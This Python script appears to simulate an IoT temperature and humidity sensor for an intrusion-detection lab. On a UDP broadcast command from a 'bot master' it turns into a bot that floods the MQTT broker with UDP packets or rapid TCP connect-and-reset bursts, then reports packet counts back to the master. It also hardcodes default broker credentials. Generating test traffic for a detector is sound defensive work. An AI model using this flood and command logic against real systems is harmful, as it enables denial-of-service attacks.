"""Simulated NodeMCU sensor & bot (matching nodemcu_bot.ino).

NORMAL mode: publishes simulated temperature and humidity every 2s to sensors/<id>.
BOT mode   : on a bot master command (one UDP broadcast packet to port 6667: "udp 10", "tcp 10", "stop",
             sent by laptop/bot.py) it floods the gateway with UDP (port 5683) or TCP (port 1883)
             for the requested time, then reverts to NORMAL. Answers go back to the bot master by UDP.
"""
import json
import math
import os
import random
import socket
import struct
import threading
import time

import paho.mqtt.client as mqtt

SID = os.environ.get("SENSOR_ID", "node1")
BROKER = os.environ.get("BROKER", "172.30.0.10")
BROKER_PORT = int(os.environ.get("BROKER_PORT", "1883"))
MQTT_USER = os.environ.get("MQTT_USER", "tinyids")
MQTT_PASS = os.environ.get("MQTT_PASS", "tinyids123")
MAX_ATTACK_SECONDS = 30
BOT_PORT = 6667                      # the bot master's broadcast commands arrive here

lock = threading.Lock()
mode = "NORMAL"
attack_ends = 0
packets_sent = 0
master = None                        # (ip, port) of the bot master, answers go there
commands = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
commands.bind(("", BOT_PORT))

client = mqtt.Client(client_id=f"sensor-{SID}")
client.username_pw_set(MQTT_USER, MQTT_PASS)


def report_status(text):
    global packets_sent
    msg = {"node": SID, "status": text, "sent": packets_sent}
    if master:
        commands.sendto(json.dumps(msg).encode(), master)
    print(f"[{SID}] status: {msg}", flush=True)


def start_attack(new_mode, seconds):
    global mode, attack_ends, packets_sent
    seconds = max(1, min(seconds, MAX_ATTACK_SECONDS))
    with lock:
        mode = new_mode
        attack_ends = time.time() + seconds
        packets_sent = 0
    report_status(f"{new_mode} started for {seconds}s")


def stop_attack():
    global mode
    with lock:
        if mode == "NORMAL":
            return
        mode = "NORMAL"
    report_status("attack stopped, back to normal")


def listen_for_commands():
    """Waits for the bot master's UDP broadcast: "udp 10", "tcp 10" or "stop"."""
    global master
    while True:
        text, master = commands.recvfrom(64)
        cmd = text.decode(errors="replace").split()
        if not cmd:
            continue
        seconds = int(cmd[1]) if len(cmd) > 1 and cmd[1].isdigit() else 10
        print(f"[{SID}] bot master command: {' '.join(cmd)} from {master[0]}", flush=True)
        if cmd[0] == "stop":
            if mode == "NORMAL":
                report_status("already normal")
            stop_attack()
        elif cmd[0] == "udp":
            start_attack("UDP_FLOOD", seconds)
        elif cmd[0] == "tcp":
            start_attack("TCP_FLOOD", seconds)


def attack_worker():
    global packets_sent
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        with lock:
            cur_mode = mode
            cur_ends = attack_ends
        if cur_mode == "NORMAL":
            time.sleep(0.05)
            continue
        if time.time() >= cur_ends:
            stop_attack()
            continue

        # Burst send packets
        for _ in range(40):
            if cur_mode == "UDP_FLOOD":
                try:
                    udp_sock.sendto(b"TINYIDS!" * 2, (BROKER, 5683))
                    packets_sent += 1
                except Exception:
                    pass
            elif cur_mode == "TCP_FLOOD":
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.02)
                    # SO_LINGER = 0 sends TCP RST upon close, bypassing TIME_WAIT so ephemeral ports never exhaust
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.connect((BROKER, BROKER_PORT))
                    s.close()
                    packets_sent += 1
                except Exception:
                    pass
            if time.time() >= cur_ends:
                break
        time.sleep(0.002)


while True:
    try:
        client.connect(BROKER, BROKER_PORT, keepalive=30)
        break
    except OSError:
        time.sleep(2)

client.loop_start()
report_status("online, normal sensor")

# Background threads: attack generator + bot master listener
threading.Thread(target=attack_worker, daemon=True).start()
threading.Thread(target=listen_for_commands, daemon=True).start()

base = 24 + random.random() * 4
t0 = time.time()

while True:
    with lock:
        cur_mode = mode
    if cur_mode == "NORMAL":
        t = time.time() - t0
        msg = {
            "node": SID,
            "temp_c": round(base + 1.5 * math.sin(t / 60) + random.gauss(0, 0.1), 2),
            "humidity": round(55 + 5 * math.sin(t / 90) + random.gauss(0, 0.3), 1),
            "uptime_s": int(t)
        }
        client.publish(f"sensors/{SID}", json.dumps(msg))
    time.sleep(2)
